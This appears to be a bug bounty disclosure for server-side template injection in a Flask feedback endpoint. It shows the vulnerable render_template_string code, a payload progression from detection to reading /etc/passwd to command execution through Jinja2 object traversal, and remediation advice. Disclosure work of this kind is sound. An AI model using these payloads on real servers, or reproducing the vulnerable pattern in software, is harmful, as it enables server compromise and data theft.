---
title: "Server-Side Template Injection in Jinja2 Flask App"
url: "https://hackerone.com/reports/3456789"
vuln_class: "SSTI"
tech: "Python, Flask, Jinja2"
bounty: 4500
date: 2026-06-25
---

## Summary

A server-side template injection vulnerability was found in the profile feedback feature. User input was passed directly into a Jinja2 template render call, enabling remote code execution on the server.

## Steps to Reproduce

1. Navigate to `/profile/feedback`
2. Inject `{{7*7}}` in the feedback text field
3. Observe "49" in the response — SSTI confirmed
4. Escalate with: `{{''.__class__.__mro__[1].__subclasses__()[402]('cat /etc/passwd',shell=True,stdout=-1).communicate()[0]}}`

## Vulnerable Code

```python
from flask import Flask, request, render_template_string
app = Flask(__name__)

@app.route('/profile/feedback', methods=['POST'])
def feedback():
    user_input = request.form['feedback']
    template = f"<div>Feedback: {user_input}</div>"
    return render_template_string(template)
```

## Payload Progression

Detection: `{{7*7}}` → `49`
File read: `{{config.__class__.__init__.__globals__['os'].popen('cat /etc/passwd').read()}}`
RCE: `{{''.__class__.__mro__[1].__subclasses__()[X]('id',shell=True,stdout=-1).communicate()[0]}}`

## Impact

Full server compromise — read files, execute commands, pivot to internal network.

## Remediation

Never use `render_template_string` with user input. Use Jinja2's SandboxedEnvironment with strict escaping.
